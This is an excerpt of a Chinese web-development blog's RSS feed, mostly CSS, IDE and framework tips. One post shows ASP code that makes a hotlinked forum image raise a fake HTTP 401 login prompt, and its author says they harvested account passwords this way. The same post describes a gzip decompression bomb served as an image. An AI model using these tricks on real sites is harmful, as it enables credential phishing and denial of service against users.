Batarang 安装地址：Chrome应用商店链接&#xA;这个不用解释，开发和调试Angular.js应用的神器。&#xA;类似的针对不同js框架的调试工具还有：Backbone DevTools 、 KnockoutJS Context&#xA;DevTools Theme 最后介绍的不是DevTools的插件，而是主题。大家或许有疑问：这个由什么用呢？嗯，没错，就是装B用的。当别人看着你在调试网页的时候，打开的Chrome开发工具竟然是如此高大上。。。</description>
    </item>
    <item>
      <title>table thead tr设置表头背景色未完全覆盖的问题</title>
      <link>https://anwangtanmi.github.io/posts/c3a016a15dbe7979c4e61af116931e31/</link>
      <pubDate>Fri, 02 Dec 2016 16:02:48 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/c3a016a15dbe7979c4e61af116931e31/</guid>
      <description>参考文章：http://blog.chinaunix.net/uid-22414998-id-2876249.html&#xA;我想要的效果如下：&#xA;实际却如下：&#xA;列头之间的那条白线很是不爽&#xA;解决方法，给table设置collapse即可：&#xA;table&#xA;{&#xA;…&#xA;border-collapse:collapse; }</description>
    </item>
    <item>
      <title>Video标签的问题</title>
      <link>https://anwangtanmi.github.io/posts/6207c39170d1683a7e90f12b33c623b7/</link>
      <pubDate>Wed, 30 Nov 2016 20:13:59 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/6207c39170d1683a7e90f12b33c623b7/</guid>
      <description>APP、M站下的H5Video标签问题 全屏播放、竖屏和横屏 封面图问题 自动播放 直播 html5和flash的播放源选择 全屏播放： APP下，Android手机不支持全屏，IOS只支持竖全屏&#xA;M站下，根据不同浏览器，可能有不同表现：例如UC浏览器是支持横竖全屏的，但是原生Safari则不支持&#xA;结论：Video标签全屏依靠浏览器（APP）的控制，需要关注APP是否设置禁用了相应的接口。否则只能用CSS或者JS来监测全屏再Hack处理。&#xA;video全屏的处理 IOS自动竖全屏&#xA;ios下设置了webkit-playsinline=&#34;true&#34; playsinline 以后，就可以不全屏播放&#xA;封面图问题 在ios下，视频被嵌入后，媒体的元数据加载完成后，会以全屏的形式显示出来，或者加个poster，可以看到画面。但在android下，多数机子是不显示视频画面的，要不就是显示一个黑色的还不是全屏的播放控件，即使及加个poster封面也不济于是。因为poster在android兼容的并不好，不如在视频上层加个div铺张图片，这个比较好的处理方式应该是：视频上加一层div做封面，由于android不允许视频上层有东西，所以首先将视频设为的width：1px，当播放后，上层的封面remove掉，同时width：100%或者你想要的宽度。&#xA;自动播放： 在Android下无法通过设置autoplay，在IOS上，除非是无声音，否则无法自动播放。（IOS新法案）。如果想用js控制播放，也必须要用户第一次点击了屏幕后才可以进行(touchstart事件)&#xA;IOS10视频播放新政策&#xA;至于「用户主动操作」具体指的是哪些行为，苹果官方有详细的说明：&#xA;点击视频播放按钮； 触发 touchend、click、doubleclick 或 keydown 事件，且在事件处理函数中直接调用 video.play() 方法。显然，button.addEventListener(&#39;click&#39;, () =&amp;gt; { video.play(); }) 满足要求；而 video.addEventListener(&#39;canplaythrough&#39;, () =&amp;gt; { video.play(); }) 不满足要求； 值得注意的是，上面讨论的是 iOS 自带 Safari 的视频播放政策。对于 iOS APP 而言，开发者在给 webview 设置 mediaPlaybackRequiresUserAction 和 allowsInlineMediaPlayback 属性之后，页面中的 ` 标签就可以通过autoplay和webkit-playsinline` 属性来启用自动播放和内联播放功能。&#xA;使用折中方案：当用户第一次touch的时候，触发play，让视频播放。同时设置playsinline和autoplay方法，提供给安卓全屏&#xA;window.addEventListener(&#39;touchstart&#39;, function videoStart() { hidePlayIcon(); $(&#39;#videosrc&#39;)[0].play(); this.removeEventListener(&#39;touchstart&#39;, videoStart); }); 其他问题： 直播场景下尝试过优酷打通，但是没试过直接做成直播平台的方案。</description>
    </item>
    <item>
      <title>深入剖析RGB、CMYK、HSB、LAB</title>
      <link>https://anwangtanmi.github.io/posts/96d03bc54271bf3e8bef5f143688d387/</link>
      <pubDate>Fri, 18 Nov 2016 16:11:11 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/96d03bc54271bf3e8bef5f143688d387/</guid>
      <description>色相：&#xA;红 —— 绿 就是色相变化，色相是色彩的首要特征，简单来说就是一眼望去是什么颜色，就是色相。&#xA;明度：&#xA;黑 —— 白 就是明度变化，就是感官上的比较亮比较暗，除了简单的添加黑白使明度变化外，不同纯色也有明度差异，把不同的纯色去色后，就可以比较明度了。&#xA;纯度： 简单来说就是饱和度，颜色越灰，一眼望去色相越不明确，纯度越低。&#xA;P.s.色环上的相邻色混合不会降低纯度，比如黄加红得到的橙色，纯度就不降低，色环的相反色混合则会降低纯度，例如红与绿。&#xA;H=色相&#xA;决定是什么颜色&#xA;S=纯度&#xA;决定颜色浓淡&#xA;B=明度决定照射在颜色上的白光有多亮 RGB: R.红色(Red) G.绿色(Green) B.蓝色(Blue) .RGB是光学三原色，所以普遍用于电视、电脑用来发布在网络&#xA;CMYK: C. 青色(Cyan) M. 洋红色(Magenta) Y. 黄色(Yellow) K. 黑色(blacK) .CMYK是印刷用的颜色，印刷RGB会失真。 Lab模式的定义&#xA;：Lab模式是由国际照明委员会（CIE）于1976年公布的一种色彩模式。是CIE组织确定的一个理论上包括了人眼可见的所有色彩的色彩模式。Lab模式弥补了 RGB与CMYK两种彩色模式的不足，是Photoshop用来从一种色彩模式向另一种色彩模式转换时使用的一种内部色彩模式。Lab模式也是由三个通道组成，第一个通道是明度，即“L”。a通道的颜色是从红色到深绿；b通道则是从蓝色到黄色。两个分量的变化都是从-120到+120。当a=0、 b=0时显示灰色，同时L=100时为白色，L=0时为黑色。如果一定要用Lab模式来表达颜色，那么R色值为：L=54、a=81、b=70；G色值为：L=88、a=-79、b=81；B色值为：L=29、a=68、b=-112；C色值为：L=62、a=-31、b=-64；M色值为：L=48、 a=83、b=-3；Y色值为：L=94、a=-14、b=100。大致上说：在表达色彩范围上，最全的是Lab模式，其次是RGB模式，最窄的是 CMYK模式。也就是说Lab模式所定义的色彩最多，且与光线及设备无关，并且处理速度与RGB模式同样快，比CMYK模式快数倍。（以上一段能理解就理解吧！）Lab模式的调色原理：LAB 模式大家都知道有三个通道，一个是明度通道另外两个是A和B通道。其中，明度通道就是亮度通道你对它进行调整颜色是不发生变化的！…</description>
    </item>
    <item>
      <title>WebStorm 自定义字体&#43;颜色&#43;语法高亮&#43;导入导出用户设置</title>
      <link>https://anwangtanmi.github.io/posts/386e51179b456fc6673c9f5845ccd973/</link>
      <pubDate>Mon, 14 Nov 2016 11:33:23 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/386e51179b456fc6673c9f5845ccd973/</guid>
      <description>WebStorm 自定义字体+颜色+语法高亮+导入导出用户设置 WebStorm是一个捷克公司开发的，功能虽然很强大，但UI貌似一直不是东欧人的强项。WebStorm默认的编辑器颜色搭配不算讲究，我看习惯了VS2012的Dark Theme，再看这个顿觉由奢入俭难，非得改改颜色才行。&#xA;新建Scheme + 修改字体 ctrl+alt+s打开Settings界面，Editor &amp;gt; Colors&amp;amp;Fonts &amp;gt; Font。&#xA;Default scheme是亮色调，但我想定制一套暗背景的环境，所以在右侧Scheme name下拉框中选择Monokai，以此作为修改的基础，然后点击Save as，给自己新建的Scheme起个名字吧，如下图：&#xA;这里面可以设置字体（我一般选择Consolas），字体大小，行间距。&#xA;自定义语法高亮 用ctrl+alt+s打开Settings界面，Editor &amp;gt; Colors&amp;amp;Fonts。&#xA;不同语言有各自的语法高亮规则，但有一部分是通用的（General），我们首先来设置General，然后再根据需要设置不同语言的语法高亮。&#xA;General的设置&#xA;普通文本：default text&#xA;折叠文本: Folded text&#xA;光标: Caret&#xA;光标所在行: Caret row&#xA;行号: Line number&#xA;TODO: TODO default&#xA;光标下变量高亮：Search result&#xA;搜索结果：Text search result&#xA;匹配的括号：Matched brace&#xA;不匹配的括号：Unmatched brace&#xA;未使用的符号：Unused symbol&#xA;左边空隙（行号，断点）：Gutter background&#xA;选中的文本背景色：Selection background&#xA;选中的文本前景色：Selection foreground&#xA;区分语言的设置&#xA;举例来说，如果要更改Javascript的语法高亮，就在上图中选择Javascript，然后再进行详细设置。具体设置项就不赘述了。&#xA;显示行号 + 自动换行 如果用Vim编程，行号是非常必要的辅助。WebStorm默认是不显示行号的，没关系，显示行号非常的容易。&#xA;只要在代码左侧的gutter区域点右键，就会出现下图的菜单：勾选上Show Line Numbers即可。&#xA;另外，勾选上图中的Use Soft Wraps就启用了WebStorm的自动换行的功能，即过长的代码行不会超出屏幕，不会出现横向的滚动条。&#xA;值得一提的是，标准的Vim，jk是移到上一行下一行，如果代码自动换行了，被分割成的两行虽然看起来是两行，但其实是一个逻辑行，这时候用jk是上移下移一个逻辑行。这种情况下，如果要从同一逻辑行的“第一行”移动到“第二行”，需要按gj，即先按g再按方向。虽然Vim提供了这个方法，但还是经常按错。</description>
    </item>
    <item>
      <title>bootstrap3 modal加载远程页面缓存问题</title>
      <link>https://anwangtanmi.github.io/posts/ca6793578050855f2ce80ae72b73ddcb/</link>
      <pubDate>Fri, 04 Nov 2016 16:03:45 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/ca6793578050855f2ce80ae72b73ddcb/</guid>
      <description>bootstrap3 modal可以通过remote参数加载一个远程页面在.modal-content中，这可以帮助我们解决许多动态内容的问题。但同时它也存在一个问题，就是会缓存页面内容。解决的方法：&#xA;//modal初始化和打开之前清除页面内容和缓存数据 $(&#39;#myModal .modal-content&#39;).empty(); $(&#39;#myModal&#39;).removeData(&#39;bs.modal&#39;).modal({ remote: &#34;xxx&#34; }); 这样就能解决缓存问题了。 需要注意的是boostrap4中去掉了modal的remote参数，也就是说不能在modal中load其他页面了，降低了灵活性。</description>
    </item>
    <item>
      <title>HTML5学习_day01(6)–html颜色的几种写法</title>
      <link>https://anwangtanmi.github.io/posts/fe91f595da9ab8e7bf04b39c0afd8188/</link>
      <pubDate>Tue, 20 Sep 2016 20:11:33 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/fe91f595da9ab8e7bf04b39c0afd8188/</guid>
      <description>颜色的几种写法 1.颜色第一种写法:用颜色名来表示,red,blue,green,pink,dark,yellow等&#xA;background-color: green;&#xA;效果：&#xA;2.颜色第二种写法:通过16进制值表示(把图片拖进PS工具，按I，按住CTRL左击你所想要的颜色就能获取颜色代码);&#xA;纯红:#FF0000=#F00;&#xA;黑色:#000000=#000;&#xA;纯白:#FFFFFF=#FFF;&#xA;background-color: #7c5c2b;&#xA;效果：&#xA;3.颜色第三种写法:通过rgb(0-255,0-255,0-255);rgb(255,255,255)代表纯红和纯绿和纯蓝混合&#xA;background-color:rgb(144,134,156);&#xA;效果：&#xA;4.颜色第四种写法:采用百分比,相对于255来取百分比.例如;&#xA;background-color:rgb(10%,40%,32%);&#xA;效果：&#xA;5.颜色第五种颜色写法:用rgba(0-255,0-255,0-255,0-1);&#xA;其中a表示颜色的透明度,取值范围为0-1(可写小数),0表示完全透明&#xA;background-color:rgba(255,0,0,0.1);&#xA;效果：</description>
    </item>
    <item>
      <title>CSS实现特殊背景效果</title>
      <link>https://anwangtanmi.github.io/posts/59a8ad9372d3dac87479105a9fe84577/</link>
      <pubDate>Wed, 27 Apr 2016 20:34:12 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/59a8ad9372d3dac87479105a9fe84577/</guid>
      <description>CSS3的出现使得一些以前需要用图片的背景效果也可以直接用CSS实现，今天分享一下三个用CSS3做的特殊背景。这三个例子都使用到了CSS3的线性渐变。&#xA;下面以webkit引擎下的线性gradient用法为例：&#xA;-webkit-linear-gradient( [&amp;lt;point&amp;gt; || &amp;lt;angle&amp;gt;,]? &amp;lt;stop&amp;gt;, &amp;lt;stop&amp;gt; [, &amp;lt;stop&amp;gt;]* )//最新线性渐变写法 -webkit-gradient(&amp;lt;type&amp;gt;, &amp;lt;point&amp;gt; [, &amp;lt;radius&amp;gt;]?, &amp;lt;point&amp;gt; [, &amp;lt;radius&amp;gt;]? [, &amp;lt;stop&amp;gt;]*) //老式语法书写规则 对于最新的线性渐变规则，第一个参数为渐变的方向，top 是从上到下、left 是从左到右，若为left top则为从左上角到右下角，也可以设置为角度，表示从某个特定的角度开始，后面的参数则为起点颜色和终点颜色，也可以在中间加上中间点颜色。 对于老式语法，type指的是渐变类型，linear（线性渐变）或radial（径向渐变），后面则依次为起点、终点位置，起点、终点颜色，中间也可加上中间点颜色，用color-stop()函数，有两个参数，第一个参数表示位置，0表示起点，0.5表示中点，1表示终点，第二个参数为颜色值。 下面介绍三个例子，所有例子都采用如下html语句：&#xA;&amp;lt;div class=&#34;test&#34;&amp;gt;div&amp;gt; 1.切角背景效果 .test{ width: 200px; height: 200px; background: -webkit-linear-gradient(right bottom, transparent 15px, #99CC99 0); } 上述代码首先给div设置了高度和宽度，然后给div的背景设置了一个线性渐变，从div的右下角开始渐变，渐变的开始是transparent也就是透明，一直持续到15px，之后立即变到颜色为#99CC99，只要#99CC99 后面的数值小于15px都会立即变到此颜色，没有渐变效果。 效果图如下： 如果我们想要在div的左下角和右下角都做出切角的效果就要用到background-size属性和background-repeat属性，具体如下：&#xA;.test{ width:200px; height:200px; background: -webkit-linear-gradient(right bottom, transparent 15px, #99CC99 0px) right,-webkit-linear-gradient(left bottom, transparent 15px, #99CC99 0px) left; background-size:50% 100%; background-repeat:no-repeat; } 上述代码给background设置了两个线性渐变，但两个渐变会彼此覆盖，因此我们需要将它们的宽度都缩小为50%，让每个渐变都只应用于div的一半，但是如果我们没有设置background-repeat为不重复的话，每个渐变还是会重复两次，依旧会彼此覆盖，所以我们设置background-size是为了让两个渐变都缩小为50%，并且不重复，这样右下角切角的位于右侧，左下角切角的位于左侧，就能够正常实现这个效果了。 效果图如下： 2.</description>
    </item>
    <item>
      <title>css中如何修改鼠标光标（指针）的样式和颜色</title>
      <link>https://anwangtanmi.github.io/posts/4cee1f0d7ce84027891a7c7f2deb6afa/</link>
      <pubDate>Wed, 30 Mar 2016 11:14:21 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/4cee1f0d7ce84027891a7c7f2deb6afa/</guid>
      <description>今天在开发过程中遇到一个问题，如下：&#xA;我的输入框的背景比较暗导致鼠标的指针（系统默认为黑色）停留在那也看不清楚。&#xA;上网查了一下，全是关于修改鼠标指针样式的，而没有颜色的教程。&#xA;那么，我在这里先简单地记一下修改样式的方法吧：&#xA;如果要自定义指针的图形的话，你可以导入自己的图片，方法就是：&#xA;cursor: url(“小图片地址”)&#xA;好了，即使我该了样式，但是我发现光标停在输入框中闪烁的那个颜色还是黑色，本来想着放弃的，但是当我修改输入框文字的颜色的时候发现光标的颜色也跟着边了，真是峰回路转啊！原来这个停留在输入框的光标颜色是和输入框文本颜色一致的，也就是可以通过设置color属性同时给文字、停留的光标设置颜色。&#xA;color:white;&#xA;搞定！</description>
    </item>
    <item>
      <title>webStorm基础设置-背景色、字体、大小</title>
      <link>https://anwangtanmi.github.io/posts/3c9859b0a17aa452263f9b7bfe660996/</link>
      <pubDate>Tue, 20 Oct 2015 09:57:31 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/3c9859b0a17aa452263f9b7bfe660996/</guid>
      <description>WebStorm是一个捷克公司开发的，功能虽然很强大，但UI貌似一直不是东欧人的强项。WebStorm默认的编辑器颜色搭配不算讲究，我看习惯了VS2012的Dark Theme，再看这个顿觉由奢入俭难，非得改改颜色才行。&#xA;新建Scheme + 修改字体 ctrl+alt+s打开Settings界面，Editor &amp;gt; Colors&amp;amp;Fonts &amp;gt; Font。&#xA;Default scheme是亮色调，但我想定制一套暗背景的环境，所以在右侧Scheme name下拉框中选择Monokai，以此作为修改的基础，然后点击Save as，给自己新建的Scheme起个名字吧，如下图：&#xA;这里面可以设置字体（我一般选择Consolas），字体大小，行间距。&#xA;自定义语法高亮 用ctrl+alt+s打开Settings界面，Editor &amp;gt; Colors&amp;amp;Fonts。&#xA;不同语言有各自的语法高亮规则，但有一部分是通用的（General），我们首先来设置General，然后再根据需要设置不同语言的语法高亮。&#xA;General的设置&#xA;普通文本：default text&#xA;折叠文本: Folded text&#xA;光标: Caret&#xA;光标所在行: Caret row&#xA;行号: Line number&#xA;TODO: TODO default&#xA;光标下变量高亮：Search result&#xA;搜索结果：Text search result&#xA;匹配的括号：Matched brace&#xA;不匹配的括号：Unmatched brace&#xA;未使用的符号：Unused symbol&#xA;左边空隙（行号，断点）：Gutter background&#xA;选中的文本背景色：Selection background&#xA;选中的文本前景色：Selection foreground&#xA;区分语言的设置&#xA;举例来说，如果要更改Javascript的语法高亮，就在上图中选择Javascript，然后再进行详细设置。具体设置项就不赘述了。&#xA;显示行号 + 自动换行 如果用Vim编程，行号是非常必要的辅助。WebStorm默认是不显示行号的，没关系，显示行号非常的容易。&#xA;只要在代码左侧的gutter区域点右键，就会出现下图的菜单：勾选上Show Line Numbers即可。&#xA;另外，勾选上图中的Use Soft Wraps就启用了WebStorm的自动换行的功能，即过长的代码行不会超出屏幕，不会出现横向的滚动条。&#xA;值得一提的是，标准的Vim，jk是移到上一行下一行，如果代码自动换行了，被分割成的两行虽然看起来是两行，但其实是一个逻辑行，这时候用jk是上移下移一个逻辑行。这种情况下，如果要从同一逻辑行的“第一行”移动到“第二行”，需要按gj，即先按g再按方向。虽然Vim提供了这个方法，但还是经常按错。&#xA;好消息是，启用了Use Soft Wraps的WebStorm不需要这样，直接按j就可以从同一逻辑行的“第一行”移动到“第二行”。</description>
    </item>
    <item>
      <title>Material Design 实现之主题使用Theme</title>
      <link>https://anwangtanmi.github.io/posts/380c8942b8ec857f9b3ce856b4f3ca8d/</link>
      <pubDate>Wed, 16 Sep 2015 16:54:06 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/380c8942b8ec857f9b3ce856b4f3ca8d/</guid>
      <description>Material Design 实现之主题使用Theme Material Design 是Google在Android L推出来的一套新的设计规范， 有着鲜明的色彩，极致的用户体验，酷炫的动画。&#xA;本系例将带给大家一套完整的Material实现方案。 预计本系例将覆盖以下几个主题：&#xA;1.MaterialDesign主题的使用 2.Toolbar的应用，及其菜单动画 3.属性动画的基本介绍（基础) 4.Transition场景动画 5.Activity的切换动画 6.reveal动画 7.触动反馈之Ripple的使用 8.触动反馈之响应动画 9.阴影介绍与CardView 10.RecycleView的使用 11.RecycleView的特效 12.AndroidL风格的下拉刷新 这是本系例的第一篇，主题的使用。&#xA;原生主题的使用 在Android 5.0中，新引入了以Material为关键字的主题。&#xA;@android:style/Theme.Material @android:style/Theme.Material.Light @android:style/Theme.Material.Light.DarkActionBar 使用方式都是在styles.xml的定义中，&#xA;但注意，这个定义不能放在values中，只能放在values-v21中。因为低版本的机型不识别这个主题。&#xA;因此，为了兼容低于androidL的机型，通常的做法，需要在values中，添加一个中间主题CustomCompactTheme。&#xA;对于values-21(高于5.0的版本), CustomCompactTheme可继承android.Theme.Material,&#xA;对于values(低于5.0的版本)，CustomCompactTheme可继承Holo。&#xA;完整代码如下： values-v21/styles.xml&#xA;values/styles.xml&#xA;兼容低版本主题的使用 幸运的是在android-support-v7包（21版以上）已经为我们实现了兼容方案，只要引入相关的主题即可。&#xA;加入v7包，在gradle.build文件的dependencies节点中加入&#xA;compile &#39;com.android.support:appcompat-v7:23.0.0&#39; 则styles.xml可以精简为&#xA;主题的配色 在theme中，我们可以为系统界面自定义一些配色，见下图。&#xA;这些配色，可以在主题中进行设置如&#xA;#675634 #993309 #7767ff #ffff33 #44ef54 效果图：&#xA;同样，在代码设置如下方式&#xA;getWindow().setStatusBarColor(0xff873434); getWindow().setNavigationBarColor(0xff345644); 效果图&#xA;ThemeOverlay 通常情况下，主题只能应用到全局，粒度最低只能到Activity这一层次， 那如果说只想把界面中的某一个布局使用主题，怎么办？这在以前是行不通的，但现在新引入Overlay系列主题就能使用到某一个ViewGroup上面，如：&#xA;这样LinearLayout所有的子元素都将继承ThemeOverlay.AppCompat.Dark的风格。&#xA;使用预定义的数值 为了与保持整个应用程序的统一，有时我们需要使用系统预定义的值，比如不同的主题下，ActionBar的高度或不一样，则为了兼容各种主题，则我们在代码中不需要把高度写死，应该使用引用的方式的设置高度，如&#xA;如上所示，同样的，在必要的时候，我们也需要引用主题的颜色，这样当换一个主题的时候，UI的颜色就随着变改，增强代码的灵活性。&#xA;源码下载： https://github.com/mutsinghua/androidLClass</description>
    </item>
    <item>
      <title>What do /deep/ and ::shadow mean in a CSS selector?</title>
      <link>https://anwangtanmi.github.io/posts/956e01d92f97ddf3b569c003a1e2df9d/</link>
      <pubDate>Wed, 19 Aug 2015 12:04:30 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/956e01d92f97ddf3b569c003a1e2df9d/</guid>
      <description>http://stackoverflow.com/a/25609679&#xA;HTML5 Web Components offer full encapsulation of CSS styles.&#xA;This means that:&#xA;styles defined within a component cannot leak out and effect the rest of the page styles defined at the page level do not modify the component’s own styles However sometimes you want to have page-level rules to manipulate the presentation of component elements defined within their shadow DOM. In order to do this, you add /deep/ to the CSS selector.</description>
    </item>
    <item>
      <title>关于servlet3.0版本java dynamic web工程中找不到web.xml的问题</title>
      <link>https://anwangtanmi.github.io/posts/6355d824d24b9d004dfa1932115c08e6/</link>
      <pubDate>Fri, 23 Jan 2015 09:49:56 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/6355d824d24b9d004dfa1932115c08e6/</guid>
      <description>写了一个form.html:&#xA;Insert title here&#xA;Beer selection Page&#xA;action=”Beerselect.do”&amp;gt;&#xA;Select beer characteristics&#xA;Color:&#xA;light&#xA;amber&#xA;brown&#xA;dark&#xA;一个servlet Beerselect.java:&#xA;package com.example.web;&#xA;import java.io.*;&#xA;import java.io.IOException;&#xA;import javax.servlet.ServletException;&#xA;import javax.servlet.annotation.WebServlet;&#xA;import javax.servlet.http.HttpServlet;&#xA;import javax.servlet.http.HttpServletRequest;&#xA;import javax.servlet.http.HttpServletResponse;&#xA;/**&#xA;* Servlet implementation class Beerselect&#xA;*/&#xA;@WebServlet(“/Beerselect.do”)&#xA;public class Beerselect extends HttpServlet {&#xA;private static final long serialVersionUID = 1L;&#xA;/**&#xA;* @see HttpServlet#HttpServlet()&#xA;*/&#xA;public Beerselect() {&#xA;super();&#xA;// TODO Auto-generated constructor stub</description>
    </item>
    <item>
      <title>three.js 源码注释（五十一）Material /MeshDepthMaterial.js</title>
      <link>https://anwangtanmi.github.io/posts/9e6a72953fd646467509bcc0ee37849f/</link>
      <pubDate>Sun, 28 Dec 2014 00:03:57 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/9e6a72953fd646467509bcc0ee37849f/</guid>
      <description>商域无疆 (http://blog.csdn.net/omni360/)&#xA;本文遵循“署名-非商业用途-保持一致”创作公用协议&#xA;转载请保留此句：商域无疆 – 本博客专注于 敏捷开发及移动和物联设备研究：数据可视化、GOLANG、Html5、WEBGL、THREE.JS，否则，出自本博客的文章拒绝转载或再转载，谢谢合作。&#xA;俺也是刚开始学,好多地儿肯定不对还请见谅.&#xA;以下代码是THREE.JS 源码文件中materials/MeshDepthMaterial.js文件的注释.&#xA;更多更新在 : https://github.com/omni360/three.js.sourcecode&#xA;/** * @author mrdoob / http://mrdoob.com/ * @author alteredq / http://alteredqualia.com/ * * parameters = { * opacity: , * * blending: THREE.NormalBlending, * depthTest: , * depthWrite: , * * wireframe: , * wireframeLinewidth: * } */ /* ///MeshDepthMaterial方法根据参数parameters创建基于相机远近裁切面自动变换亮度(明暗度)的mesh(网格)的材质类型,离相机越近,材质越亮(白),离相机越远,材质越暗(黑). ///parameters参数的格式看上面.MeshDepthMaterial对象的功能函数采用,定义构造的函数原型对象来实现.大部分属性方法继承自材质的基类Material. */ ///MeshDepthMaterial ///string类型的JSON格式材质属性参数 ///返回MeshDepthMaterial,网格深度材质. THREE.MeshDepthMaterial = function ( parameters ) { THREE.Material.call( this );&#x9;//调用Material对象的call方法,将原本属于Material的方法交给当前对象MeshDepthMaterial来使用. this.</description>
    </item>
    <item>
      <title>为什么在网页上看到的广告正好是你感兴趣的？–网络臭虫</title>
      <link>https://anwangtanmi.github.io/posts/189c353a4b22fde915430b7ccbedae09/</link>
      <pubDate>Thu, 06 Nov 2014 17:05:00 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/189c353a4b22fde915430b7ccbedae09/</guid>
      <description>相信大家也会发现这个现象，在浏览网页时，看到你们嵌入的广告正时自己感兴趣的产品。我最近调查了一下，这其中还是有猫腻的。&#xA;其中我们需要了解两个概念：cookie和网络臭虫。cookie相信大家都了解，就不多说了。下面看看我在wiki上看到的对网络臭虫的解释&#xA;”网络信标（web beacon），又称网页臭虫（web bug），是可以暗藏在任何网页元素或邮件内的1像素大小的透明GIF或PNG图片，常用来收集目标电脑用户的上网习惯等数据，并将这些数据写入Cookie。网络信标在邮件跟踪和垃圾邮件中较为常用。网络臭虫（Web bug）也称为网络信标（Web beacon）是一个放在网页或电子邮件上的文件对象，用于监测用户的行为。 不像Cookie可以被浏览器用户接受或拒绝，网络臭虫只是以图形交换格式（GIF）或其他文件对象的形式出现。 它通常只能被检测，如果用户查看网页的源版本会发现一个从不同的Web服务器而不是从网页的其他部分负载的标签。“&#xA;接着上面的解释往下说，在访问那个图片时，http请求会携带cookie发往这个图片所在服务器，也就是臭虫服务器。这个过程可以被利用来统计宿主网页有没有被访问，垃圾邮件中经常这样用来看随机生成的地址发出去有没有被人点开从而确认该邮件地址是否真存在。还有一种就是臭虫服务器是一经常被人用到的网站，比如百度。每次你每次输入并搜索时，你的输入会被存为百度的cookie。然后百度和第三方的网页勾搭，百度说我给你一段js文件链接你放到你的网页中去，当然这个js是在百度服务器上的，等用户访问你的网页时，就会发请求到百度的服务器上，同时会带上百度以前存在客户本地的cookie，这样这段js就拿到了百度的cookie并且在当前页面上插入对应的广告链接。这就是为什么在一些网站上能看到你在百度啊或者电商哪里搜索的关键字对应的广告了。甚至我想，百度和电商之间也可以做类似的交易，电商从百度拿到cookie后可以在用户首页上直接显示用户可能感兴趣的商品。看来这个臭虫很有商业价值的，不过它的合法性存在争议，也在315时被央视曝光过。</description>
    </item>
    <item>
      <title>外链图片也有风险吗？</title>
      <link>https://anwangtanmi.github.io/posts/91df4127413a3972aa05ff087ec5d935/</link>
      <pubDate>Tue, 22 Jul 2014 01:22:42 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/91df4127413a3972aa05ff087ec5d935/</guid>
      <description>一直以来，各大论坛和邮箱都允许使用外链图片。一方面解决了上传和保存带来的资源消耗，更重要的是方便用户转载图片。&#xA;然而，简单的背后是否暗藏着什么风险呢？大多或许认为，不就是插入了一张外部图片而已，又不是什么脚本或插件，能有多大的安全隐患。&#xA;曾经也有过外链图片泄漏cookie那样的重大隐患，不过那都是很久以前的事了。在如今浏览器日新月异的年代里，这样的bug已经很难遇到了。不过利用正常的游戏规则，我们仍能玩出一些安全上的小花招。&#xA;No.1 —— HTTP401 （严重程度：低）&#xA;大家都见过，打开路由器的时候会弹出个登录框。&#xA;如果了解HTTP协议的话，这是服务器返回401，要求用户名密码认证。&#xA;不过，如果是一个图片的请求，返回401又会怎样呢？很简单，我们就用路由器的URL测试下：&#xA;居然依旧跳出了一个对话框！&#xA;如果将一个HTTP401的图片插入到论坛里，是不是也会如此呢？我们用ASP写个简单的脚本，并且能自定义提示文字：&#xA;&amp;lt;% Response.Status = &#34;401&#34; Response.AddHeader &#34;WWW-Authenticate&#34;, &#34;Basic realm=IP IC IQ卡，统统告诉我密码！&#34; %&amp;gt; 然后将URL插入到论坛或空间（如果拒绝.asp结尾的url图片，那就在后面加上个?.png）。&#xA;先在QQ空间里测试下：&#xA;不出所料，弹出了对话框。不过在ie外的浏览器下，汉字成了乱码，即使设置了ASP以及HTTP的编码也不管用。&#xA;我们只好换成英文字符，再百度贴吧里用各种浏览器测试下：&#xA;ie678:&#xA;ie9:　firefox:&#xA;safari:　除了Opera和Chrome没有弹出来，其他的浏览器都出现。不过部分浏览器截断了空格后的字符。&#xA;当然，你也可以扩展这个功能，记录用户输入了什么内容。尤其是带上些官方式的文字提示，很容易用来捕捉到一些账号信息。曾经用这招在论坛抓到不少可用的账号密码，不过如今安全意识普遍提高，加上一些安全软件的拦截，这招实用性大打折扣了。&#xA;因为是强制弹出的，往往给人一惊，所以在论坛，贴吧或空间里，倒是可以娱乐娱乐。&#xA;No.2 ———— GZip压缩zha弹 （ 严重程序：中）&#xA;在之前的一篇文章里，谈到使用两次deflate压缩，将数百兆的图片文件压缩到几百字节。&#xA;http://www.cnblogs.com/index-html/archive/2012/06/22/2558469.html&#xA;原理很简单，大量重复数据有很高的压缩率。之前不清楚的deflate算法的最大压缩率有多少，一直不敢确定是不是最优的。后来大致了解了下算 法，由于受到lz77算法的最大匹配长度限制，deflate的最大压缩率确实只有1:1000多点。虽然和rar相比相差甚远，不过1000倍也意味 着，1M的数据可以翻到1G了。&#xA;所以我们可以利用一个超高的压缩的HTTP报文，做几件事：&#xA;1.消耗内存&#xA;2.消耗CPU&#xA;3.消耗缓存&#xA;对于现在的硬件配置，内存已经足够支撑浏览器，多核的CPU也没法完全耗尽，唯独硬盘是个瓶颈。&#xA;我们用C程序创建个1G的内存数组，将图片数据放在其首，后面用’\0’填充。然后使用zlib进行压缩，得到1M左右的结果，保存为x.jpg.gz&#xA;接着用ASP读取压缩文件，并给返回的头部加上Content-Encoding字段。&#xA;简单的测试下：&#xA;Dim stream Set stream = Server.CreateObject(&#34;ADODB.Stream&#34;) With stream .Type = 1 .Open .LoadFromFile _ Server.MapPath(Request.QueryString(&#34;File&#34;) &amp;amp; &#34;.gz&#34;) End With Dim agent agent = Request.</description>
    </item>
    <item>
      <title>网络臭虫</title>
      <link>https://anwangtanmi.github.io/posts/21c7f2f9346629b903b647b9162a75e0/</link>
      <pubDate>Wed, 02 Apr 2014 13:49:56 +0800</pubDate>
